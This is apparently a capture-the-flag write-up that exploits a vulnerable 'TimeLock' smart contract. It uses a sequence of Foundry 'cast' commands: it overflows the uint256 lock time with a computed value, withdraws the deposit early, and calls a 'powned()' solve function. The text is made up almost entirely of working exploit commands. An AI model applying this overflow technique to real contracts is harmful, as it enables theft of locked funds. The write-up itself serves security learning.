**Exploit**
---

**Deposit 5 times to add enough money to the vault**

```
cast send $TIMELOCK "deposit()" --private-key $PRIVATE_KEY --rpc-url $RPC
```
**Get current lockTime**
```
cast call $TIMELOCK "lockTime()(uint256)" --rpc-url $RPC
```
**Overflow the lock**

type(uint256).max = 115792089237316195423570985008687907853269984665640564039457584007913129639935

overflow_value = type(uint256).max - current_lockTime + 1
```
cast send $TIMELOCK "increaseLockTime(uint256)" 115792089237316195423570985008687907853269984665640564039457584007906025833228 --private-key $PRIVATE_KEY --rpc-url $RPC
```
**Withdraw**
```
cast send $TIMELOCK "withdraw()" --private-key $PRIVATE_KEY --rpc-url $RPC
```
**Call powned()**
```
cast send $TIMELOCK "powned()" --private-key $PRIVATE_KEY --rpc-url $RPC
```